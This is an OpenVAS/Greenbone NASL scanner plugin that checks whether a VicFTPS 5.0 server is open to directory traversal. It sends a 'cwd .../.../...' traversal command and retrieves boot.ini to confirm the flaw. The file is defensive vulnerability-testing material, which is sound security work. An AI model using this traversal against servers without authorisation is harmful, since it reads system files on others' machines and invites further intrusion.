# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100625");
  script_version("2025-01-17T15:39:18+0000");
  script_tag(name:"last_modification", value:"2025-01-17 15:39:18 +0000 (Fri, 17 Jan 2025)");
  script_tag(name:"creation_date", value:"2010-05-05 18:44:23 +0200 (Wed, 05 May 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_name("VicFTPS Directory Traversal Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/39919");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("FTP");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "os_detection.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("Host/runs_windows", "ftp/vicftps/detected");

  script_tag(name:"summary", value:"VicFTPS is prone to a directory traversal vulnerability because it
  fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"impact", value:"Exploiting this issue can allow an attacker to download arbitrary
  files outside of the FTP server root directory. This may aid in further attacks.");

  script_tag(name:"affected", value:"VicFTPS (Victory FTP Server) 5.0 is vulnerable. Other versions may
  also be affected.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("ftp_func.inc");
include("port_service_func.inc");

ftpPort = ftp_get_port(default:21);
banner = ftp_get_banner(port:ftpPort);
if(!banner || "VicFTPS" >!< banner)
  exit(0);

soc1 = open_sock_tcp(ftpPort);
if(!soc1)
  exit(0);

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

login_details = ftp_log_in(socket:soc1, user:user, pass:pass);
if(login_details) {
  ftpPort2 = ftp_get_pasv_port(socket:soc1);
  if(ftpPort2) {
    soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
    if(soc2) {
      send(socket:soc1, data:string("cwd .../.../.../.../.../.../.../.../\r\n"));
      result = ftp_recv_line(socket:soc1);
      if("250" >!< result) {
        ftp_close(socket:soc1);
        close(soc2);
        close(soc1);
        exit(0);
      }

      send(socket:soc1, data:string("retr boot.ini\r\n"));
      result = ftp_recv_data(socket:soc2);
      close(soc2);
      ftp_close(socket:soc1);
      close(soc1);
    }
  }

  if(result && egrep(pattern:"\[boot loader\]", string:result)) {
   security_message(port:ftpPort);
   exit(0);
  }
} else {
  close(soc1);
  exit(0);
}

exit(0);
